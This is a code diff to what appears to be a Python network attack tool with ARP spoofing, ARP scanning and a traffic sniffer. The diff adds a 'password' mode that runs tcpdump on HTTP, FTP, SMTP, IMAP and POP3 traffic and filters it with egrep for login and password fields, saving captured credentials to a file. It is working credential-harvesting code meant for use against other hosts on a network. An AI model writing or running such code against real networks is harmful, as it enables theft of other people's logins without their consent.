@@ -34,8 +34,10 @@ class Sniffer(Thread):
         my_mac = getHwAddr(self.interface)
         if self.type == "dns":
             arg = "sudo tshark -i "+self.interface+" -f 'dst port 53 or port 80' -Y 'eth.src!="+my_mac+"' -T ps > "+self.output
-            os.system(arg) #-Y 'eth.src!=''
-
+            os.system(arg)
+        if self.type == "password":
+            arg = "sudo tcpdump port http or port ftp or port smtp or port imap or port pop3 -l -A -i "+self.interface+"| egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-buffered -B20 > "+self.output
+            os.system(arg)
 class Spoofer(Thread):
     def __init__(self, gateway_ip, target_ip, my_mac, interface):
         Thread.__init__(self)
@@ -197,7 +199,7 @@ def arp_scan(my_interface, decoy=False, verbosity=0, output="./result/scanNetwor
     for snd, rcv in ans:
         his_ip = rcv.sprintf(r"%Ether.psrc%")
         his_mac = rcv.sprintf(r"%Ether.src%")
-        
+
         my_file.write(his_ip+" "+his_mac)
         if decoy and nb_decoy > 0:
             my_thread = Decoy(str(his_ip), addr_list, my_interface)
